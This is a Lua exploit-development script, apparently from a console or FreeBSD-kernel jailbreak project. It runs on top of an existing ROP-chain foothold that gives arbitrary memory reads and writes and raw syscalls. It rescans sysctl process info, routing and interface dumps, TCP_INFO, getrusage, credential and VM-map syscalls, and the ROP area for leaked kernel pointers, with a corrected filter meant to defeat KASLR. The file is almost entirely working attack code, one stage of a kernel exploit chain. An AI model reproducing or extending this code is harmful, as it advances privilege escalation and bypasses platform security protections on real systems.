-- CRASH_CLASS: LOW
-- PROBE 400a: Rescan all data sources with CORRECTED kernel pointer filter
--
-- CRITICAL DISCOVERY: 13.60 kernel base = 0xFFFFFFFF_9E3F0000
-- hi32 = 0xFFFFFFFF — our scans excluded this as "sentinel"!
-- All previous "zero kernel pointers" findings may be WRONG.
--
-- Correct filter: hi==0xFFFFFFFF AND lo in [0x80000000, 0xFFFE0000)
-- Excludes: 0xFFFFFFFF_FFFFFFFF (-1), 0xFFFFFFFF_00000000 (mask)
--
-- Rescan: sysctl kinfo_proc, TCP_INFO, /dev/usb, NET_RT_DUMP,
-- getrusage, SCM_CREDS, signal frame, thread ucontext

print("=== PROBE 400a: kptr rescan (corrected filter) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive()
    local ok, v = pcall(function() return native.fcall_with_rax(stub, 20) end)
    return ok and N(v) == pid_val
end

-- CORRECTED kernel pointer check
-- 13.60 base = 0xFFFFFFFF9E3F0000, text ends ~0xFFFFFFFF9F270000
-- Kernel heap/data could be anywhere in 0xFFFFFFFF_80000000+
-- Also check 0xFFFF8000-0xFFFFFFFE range (direct map, other regions)
local function is_kptr(hi, lo)
    if hi == nil or lo == nil then return false end
    -- Range 1: hi in [0xFFFF8000, 0xFFFFFFFE] — original filter (was working)
    if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF and lo ~= 0 then
        return true
    end
    -- Range 2: hi == 0xFFFFFFFF — THE MISSING RANGE
    -- Exclude obvious sentinels
    if hi == 0xFFFFFFFF then
        if lo == 0 then return false end            -- 0xFFFFFFFF_00000000 (mask)
        if lo == 0xFFFFFFFF then return false end    -- -1
        if lo == 0xFFFFFFFE then return false end    -- -2
        if lo == 0xFFFFFFFC then return false end    -- aligned -4
        if lo == 0xFFFFFFF0 then return false end    -- aligned -16
        if lo < 0x1000 then return false end         -- small positive in lo (unlikely kptr)
        -- Kernel range: lo >= 0x80000000 is canonical kernel
        -- lo in [0x80000000, 0xFFFFF000) = likely kernel address
        if lo >= 0x80000000 then return true end
        -- lo in [0x00001000, 0x80000000) = possibly kernel data/heap
        -- (FreeBSD direct map can put kernel data here)
        -- Be conservative: flag but mark as uncertain
        return "maybe"
    end
    return false
end

local function scan_buffer(buf_addr, size, label)
    local hits = {}
    local maybes = {}
    for off = 0, size - 8, 4 do
        local lo = rd(buf_addr + off)
        local hi = rd(buf_addr + off + 4)
        if lo and hi then
            local result = is_kptr(hi, lo)
            if result == true then
                table.insert(hits, {off, hi, lo})
            elseif result == "maybe" then
                table.insert(maybes, {off, hi, lo})
            end
        end
    end
    if #hits > 0 then
        print(string.format("  %s: ★★★ %d CONFIRMED kptr ★★★", label, #hits))
        for _, h in ipairs(hits) do
            print(string.format("    +%04X: %08X_%08X", h[1], h[2], h[3]))
        end
    end
    if #maybes > 0 then
        print(string.format("  %s: %d uncertain (0xFFFFFFFF_low)", label, #maybes))
        for i, m in ipairs(maybes) do
            if i <= 5 then
                print(string.format("    +%04X: %08X_%08X ?", m[1], m[2], m[3]))
            end
        end
    end
    if #hits == 0 and #maybes == 0 then
        print(string.format("  %s: 0 kptr (confirmed clean)", label))
    end
    return hits, maybes
end

-- Ignore signals
local sa = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(sa) + i, 0) end
wq(sa, uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

local all_hits = 0
local all_maybes = 0

-- ============================================
-- PART A: sysctl kern.proc.pid (kinfo_proc = 1096 bytes)
-- ============================================
print("-- A: kinfo_proc --")

local sc202 = mk(202)
local mib = memory.alloc(16)
wd(N(mib), 1)        -- CTL_KERN
wd(N(mib) + 4, 14)   -- KERN_PROC
wd(N(mib) + 8, 1)    -- KERN_PROC_PID
wd(N(mib) + 12, pid_val)

local kinfo = memory.alloc(0x500)
for i = 0, 0x4FC, 4 do wd(N(kinfo) + i, 0) end
local oldsz = memory.alloc(8)
wq(oldsz, uint64(0x500))

local ok_a, rv_a = pcall(function()
    return sc202(uint64(N(mib)), uint64(4), uint64(N(kinfo)),
        uint64(N(oldsz)), uint64(0), uint64(0))
end)
local ret_a = ok_a and N(rv_a) or -1
if ret_a > 0x7FFFFFFF then ret_a = -1 end

local kinfo_sz = rd(N(oldsz)) or 0
print(string.format("  sysctl ret=%d size=%d", ret_a, kinfo_sz))

if ret_a == 0 and kinfo_sz > 0 then
    local h, m = scan_buffer(N(kinfo), math.min(kinfo_sz, 0x500), "kinfo_proc")
    all_hits = all_hits + #h
    all_maybes = all_maybes + #m

    -- Also dump specific offsets known to contain pointers on FreeBSD
    -- ki_paddr (+0x00 on some versions), ki_addr, ki_vmspace
    print("  key offsets (qwords):")
    local key_offsets = {
        {0x00, "ki_structsize"},
        {0x08, "ki_paddr(?)"},
        {0x10, "ki_addr(?)"},
        {0x18, "ki_vmspace(?)"},
        {0x48, "ki_pid area"},
        {0xB8, "ki_runtime"},
        {0x1C0, "ki_kstack(?)"},
        {0x1C8, "?"},
        {0x1D0, "?"},
        {0x1D8, "?"},
        {0x200, "?"},
        {0x240, "?"},
        {0x280, "?"},
        {0x2C0, "?"},
        {0x300, "?"},
        {0x340, "?"},
        {0x380, "?"},
        {0x3C0, "?"},
        {0x400, "?"},
        {0x430, "?"},
    }
    for _, ko in ipairs(key_offsets) do
        if ko[1] + 4 < kinfo_sz then
            local lo = rd(N(kinfo) + ko[1])
            local hi = rd(N(kinfo) + ko[1] + 4)
            if lo and hi and (lo ~= 0 or hi ~= 0) then
                local tag = ""
                if is_kptr(hi, lo) == true then tag = " ★KPTR★"
                elseif is_kptr(hi, lo) == "maybe" then tag = " ?kptr?" end
                print(string.format("    +%03X %-16s: %08X_%08X%s",
                    ko[1], ko[2], hi, lo, tag))
            end
        end
    end
end
if not alive() then print("CANARY FAIL A"); return end

-- ============================================
-- PART B: /dev/usb read (328 bytes)
-- ============================================
print("")
print("-- B: /dev/usb --")

local usb_path = memory.alloc(32)
for i = 0, 28, 4 do wd(N(usb_path) + i, 0) end
wd(N(usb_path), 0x7665642F)     -- /dev
wd(N(usb_path) + 4, 0x6273752F) -- /usb
wd(N(usb_path) + 8, 0)

local sc_open = mk(5)
local sc_read = mk(3)
local sc_close = mk(6)

local ok_usb, usb_fd = pcall(function()
    return sc_open(uint64(N(usb_path)), uint64(0), uint64(0))
end)
usb_fd = ok_usb and N(usb_fd) or -1
if usb_fd > 10000 then usb_fd = -1 end

if usb_fd >= 0 then
    pcall(function() mk(92)(uint64(usb_fd), uint64(4), uint64(0x0004)) end)
    local usbbuf = memory.alloc(0x200)
    for i = 0, 0x1FC, 4 do wd(N(usbbuf) + i, 0) end
    local ok_ur, rv_ur = pcall(function()
        return sc_read(uint64(usb_fd), uint64(N(usbbuf)), uint64(0x200))
    end)
    local ubytes = ok_ur and N(rv_ur) or -1
    if ubytes > 0x7FFFFFFF then ubytes = -1 end
    print(string.format("  bytes=%d", ubytes))
    if ubytes > 0 then
        local h, m = scan_buffer(N(usbbuf), ubytes, "/dev/usb")
        all_hits = all_hits + #h
        all_maybes = all_maybes + #m
    end
    pcall(function() sc_close(uint64(usb_fd)) end)
end
if not alive() then print("CANARY FAIL B"); return end

-- ============================================
-- PART C: NET_RT_DUMP (routing table)
-- ============================================
print("")
print("-- C: NET_RT_DUMP --")

local rtmib = memory.alloc(24)
wd(N(rtmib), 4)       -- CTL_NET
wd(N(rtmib) + 4, 17)  -- PF_ROUTE
wd(N(rtmib) + 8, 0)   -- protocol
wd(N(rtmib) + 12, 0)  -- AF_UNSPEC
wd(N(rtmib) + 16, 1)  -- NET_RT_DUMP
wd(N(rtmib) + 20, 0)  -- flags

-- First get size
local rtsz = memory.alloc(8)
wq(rtsz, uint64(0))
pcall(function()
    sc202(uint64(N(rtmib)), uint64(6), uint64(0), uint64(N(rtsz)), uint64(0), uint64(0))
end)
local rt_need = rd(N(rtsz)) or 0
print(string.format("  needed=%d", rt_need))

if rt_need > 0 and rt_need < 0x10000 then
    local rtbuf = memory.alloc(rt_need + 64)
    for i = 0, rt_need + 60, 4 do wd(N(rtbuf) + i, 0) end
    wq(rtsz, uint64(rt_need + 64))

    local ok_rt, rv_rt = pcall(function()
        return sc202(uint64(N(rtmib)), uint64(6), uint64(N(rtbuf)),
            uint64(N(rtsz)), uint64(0), uint64(0))
    end)
    local rt_ret = ok_rt and N(rv_rt) or -1
    if rt_ret > 0x7FFFFFFF then rt_ret = -1 end
    local rt_got = rd(N(rtsz)) or 0
    print(string.format("  ret=%d got=%d", rt_ret, rt_got))

    if rt_ret == 0 and rt_got > 0 then
        local h, m = scan_buffer(N(rtbuf), rt_got, "NET_RT_DUMP")
        all_hits = all_hits + #h
        all_maybes = all_maybes + #m
    end
end
if not alive() then print("CANARY FAIL C"); return end

-- ============================================
-- PART D: TCP_INFO (236 bytes)
-- ============================================
print("")
print("-- D: TCP_INFO --")

local sc_socket = mk(97)
local ok_sock, tcp_fd = pcall(function()
    return sc_socket(uint64(2), uint64(1), uint64(6))  -- AF_INET, SOCK_STREAM, TCP
end)
tcp_fd = ok_sock and N(tcp_fd) or -1
if tcp_fd > 10000 then tcp_fd = -1 end

if tcp_fd >= 0 then
    local ti_buf = memory.alloc(0x200)
    for i = 0, 0x1FC, 4 do wd(N(ti_buf) + i, 0xDEADBEEF) end
    local ti_len = memory.alloc(8)
    wq(ti_len, uint64(0x200))

    local sc_gso = mk(118)  -- getsockopt
    local ok_ti, rv_ti = pcall(function()
        return sc_gso(uint64(tcp_fd), uint64(6), uint64(32),  -- IPPROTO_TCP, TCP_INFO
            uint64(N(ti_buf)), uint64(N(ti_len)))
    end)
    local ti_ret = ok_ti and N(rv_ti) or -1
    if ti_ret > 0x7FFFFFFF then ti_ret = -1 end
    local ti_got = rd(N(ti_len)) or 0
    print(string.format("  ret=%d size=%d", ti_ret, ti_got))

    if ti_ret == 0 and ti_got > 0 then
        local h, m = scan_buffer(N(ti_buf), ti_got, "TCP_INFO")
        all_hits = all_hits + #h
        all_maybes = all_maybes + #m
    end
    pcall(function() sc_close(uint64(tcp_fd)) end)
end
if not alive() then print("CANARY FAIL D"); return end

-- ============================================
-- PART E: getrusage (144 bytes)
-- ============================================
print("")
print("-- E: getrusage --")

local ru_buf = memory.alloc(0x100)
for i = 0, 0xFC, 4 do wd(N(ru_buf) + i, 0xDEADBEEF) end
local sc_getru = mk(117)
local ok_ru, rv_ru = pcall(function()
    return sc_getru(uint64(0), uint64(N(ru_buf)))  -- RUSAGE_SELF
end)
local ru_ret = ok_ru and N(rv_ru) or -1
if ru_ret > 0x7FFFFFFF then ru_ret = -1 end
print(string.format("  ret=%d", ru_ret))

if ru_ret == 0 then
    local h, m = scan_buffer(N(ru_buf), 144, "getrusage")
    all_hits = all_hits + #h
    all_maybes = all_maybes + #m
end
if not alive() then print("CANARY FAIL E"); return end

-- ============================================
-- PART F: NET_RT_IFLISTL (interface list — 6536 bytes in 54f)
-- ============================================
print("")
print("-- F: NET_RT_IFLISTL --")

local ifmib = memory.alloc(24)
wd(N(ifmib), 4)       -- CTL_NET
wd(N(ifmib) + 4, 17)  -- PF_ROUTE
wd(N(ifmib) + 8, 0)   -- protocol
wd(N(ifmib) + 12, 0)  -- AF_UNSPEC
wd(N(ifmib) + 16, 5)  -- NET_RT_IFLISTL
wd(N(ifmib) + 20, 0)

local ifsz = memory.alloc(8)
wq(ifsz, uint64(0))
pcall(function()
    sc202(uint64(N(ifmib)), uint64(6), uint64(0), uint64(N(ifsz)), uint64(0), uint64(0))
end)
local if_need = rd(N(ifsz)) or 0
print(string.format("  needed=%d", if_need))

if if_need > 0 and if_need < 0x4000 then
    local ifbuf = memory.alloc(if_need + 64)
    for i = 0, if_need + 60, 4 do wd(N(ifbuf) + i, 0) end
    wq(ifsz, uint64(if_need + 64))

    local ok_if, rv_if = pcall(function()
        return sc202(uint64(N(ifmib)), uint64(6), uint64(N(ifbuf)),
            uint64(N(ifsz)), uint64(0), uint64(0))
    end)
    local if_ret = ok_if and N(rv_if) or -1
    if if_ret > 0x7FFFFFFF then if_ret = -1 end
    local if_got = rd(N(ifsz)) or 0
    print(string.format("  ret=%d got=%d", if_ret, if_got))

    if if_ret == 0 and if_got > 0 then
        local h, m = scan_buffer(N(ifbuf), if_got, "NET_RT_IFLISTL")
        all_hits = all_hits + #h
        all_maybes = all_maybes + #m
    end
end
if not alive() then print("CANARY FAIL F"); return end

-- ============================================
-- PART G: sys 587 credential metadata (0x88 bytes)
-- ============================================
print("")
print("-- G: sys 587 cred --")

local credbuf = memory.alloc(0x100)
for i = 0, 0xFC, 4 do wd(N(credbuf) + i, 0) end
local ok_cr, rv_cr = pcall(function()
    return mk(587)(uint64(N(credbuf)), uint64(0x100), uint64(0), uint64(0), uint64(0), uint64(0))
end)
local cr_ret = ok_cr and N(rv_cr) or -1
if cr_ret > 0x7FFFFFFF then cr_ret = -1 end
print(string.format("  ret=%d", cr_ret))

if cr_ret == 0 then
    local h, m = scan_buffer(N(credbuf), 0x88, "sys587_cred")
    all_hits = all_hits + #h
    all_maybes = all_maybes + #m

    -- Dump all non-zero qwords
    for off = 0, 0x84, 8 do
        local lo = rd(N(credbuf) + off)
        local hi = rd(N(credbuf) + off + 4)
        if lo and hi and (lo ~= 0 or hi ~= 0) then
            print(string.format("    +%02X: %08X_%08X", off, hi, lo))
        end
    end
end
if not alive() then print("CANARY FAIL G"); return end

-- ============================================
-- PART H: sys 674 VM map — full scan of all region records
-- 72 bytes each, scan the internal fields for kptr
-- ============================================
print("")
print("-- H: sys 674 VM map records --")

local sc674 = mk(674)
local vm_buf = memory.alloc(0x100)
local vm_addr = uint64(0)
local vm_kptr = 0
local vm_maybe = 0
local vm_regions = 0

for i = 1, 400 do
    for j = 0, 0xFC, 4 do wd(N(vm_buf) + j, 0) end

    local ok_vm, rv_vm = pcall(function()
        return sc674(vm_addr, vm_buf, uint64(0x100))
    end)
    if not ok_vm or N(rv_vm) == 0xFFFFFFFF then break end

    vm_regions = vm_regions + 1

    -- Scan the full record (72 bytes) for kernel pointers
    -- Offsets 0x00=start, 0x08=end, 0x10=???, 0x18=prot, 0x20=name
    -- But also check offsets that might hold kernel object pointers
    for off = 0, 68, 4 do
        local lo = rd(N(vm_buf) + off)
        local hi = rd(N(vm_buf) + off + 4)
        if lo and hi then
            local result = is_kptr(hi, lo)
            if result == true then
                vm_kptr = vm_kptr + 1
                if vm_kptr <= 10 then
                    print(string.format("  region %d +%02X: %08X_%08X ★KPTR★",
                        vm_regions, off, hi, lo))
                end
            elseif result == "maybe" then
                vm_maybe = vm_maybe + 1
                if vm_maybe <= 5 then
                    print(string.format("  region %d +%02X: %08X_%08X ?kptr?",
                        vm_regions, off, hi, lo))
                end
            end
        end
    end

    -- Advance to next region
    local end_lo = rd(N(vm_buf) + 8) or 0
    local end_hi = rd(N(vm_buf) + 12) or 0
    if end_lo == 0 and end_hi == 0 then break end
    vm_addr = uint64(string.format("0x%X%08X", end_hi, end_lo))

    if i % 100 == 0 and not alive() then print("CANARY FAIL H"); return end
end

print(string.format("  regions=%d kptr=%d maybe=%d", vm_regions, vm_kptr, vm_maybe))
if not alive() then print("CANARY FAIL H2"); return end

-- ============================================
-- PART I: Also scan PIPE metadata (the ROP area)
-- ============================================
print("")
print("-- I: pipe/rop metadata --")

local pipe_str = tostring(syscall.pipe)
print("  pipe=" .. pipe_str)

local fn_str = pipe_str:match("fn_addr: (0x[0-9a-fA-F]+)")
local rop_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")

if rop_str then
    local rop_addr_n = tonumber(rop_str)
    if rop_addr_n then
        -- Scan rop chain area for kernel pointers
        local rop_hits = 0
        for off = 0, 0x200, 4 do
            local lo = rd(rop_addr_n + off)
            local hi = rd(rop_addr_n + off + 4)
            if lo and hi then
                local result = is_kptr(hi, lo)
                if result == true then
                    rop_hits = rop_hits + 1
                    print(string.format("  rop+%03X: %08X_%08X ★KPTR★", off, hi, lo))
                elseif result == "maybe" then
                    print(string.format("  rop+%03X: %08X_%08X ?kptr?", off, hi, lo))
                end
            end
        end
        if rop_hits == 0 then
            print("  rop area: 0 kptr")
        end
    end
end

-- ============================================
-- SUMMARY
-- ============================================
print("")
print("=== SUMMARY ===")
print(string.format("Total CONFIRMED kptr: %d", all_hits))
print(string.format("Total uncertain kptr: %d", all_maybes))
print(string.format("13.60 kernel base: 0xFFFFFFFF_9E3F0000"))
print(string.format("Expected kptr range: 0xFFFFFFFF_9E000000 - 0xFFFFFFFF_A0000000"))
print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 400a COMPLETE ===")
